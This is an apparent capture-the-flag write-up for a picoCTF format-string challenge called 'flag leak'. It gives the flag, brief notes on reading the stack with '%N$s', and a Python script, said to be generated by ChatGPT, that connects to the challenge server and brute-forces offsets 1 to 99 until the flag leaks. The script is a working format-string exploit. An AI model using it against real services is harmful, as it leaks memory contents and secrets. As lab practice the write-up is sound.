# Binary Exploitation

## flag leak
### Flag
* flag: CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
### Thought process
* using a technique i found in google using format strings for accessing sections of stack with "%1$s" is the closest i came to finding the flag
* i didnt have time cause its already 11 and i only have 1 hr to finish the entire web exploitaton section
* so i thought why not write a python script and brute force through all section of the stack 1 to a 100
* doing so let me find the flag at the 24th position
### Code Used
```py
# this is chatgpt'd
#Prompt : c saturn.picoctf.net 59949 this is the connection to run the file, what if i run a forloop in python that iterates through %i$s
import socket

# Server details
host = 'saturn.picoctf.net'
port = 59949

def send_payload(offset):
    # Construct the format string payload to send
    payload = f"%{offset}$s\n"
    
    # Set up the socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))  # Connect to the server
        s.recv(1024)  # Receive the initial welcome message
        s.sendall(payload.encode())  # Send the crafted payload
        try:
            response = s.recv(1024).decode()
        except: 
            response = '' 
        return response

def main():
    # Try different offsets to see if we can find the flag
    for i in range(1, 100):
        print(f"Sending payload with offset %{i}$s")
        response = send_payload(i)
        print("Response:", response)
        if "picoCTF" in response:  # Look for the flag format (usually starts with picoCTF)
            print(f"Flag found: {response}")
            break

if __name__ == "__main__":
    main()
```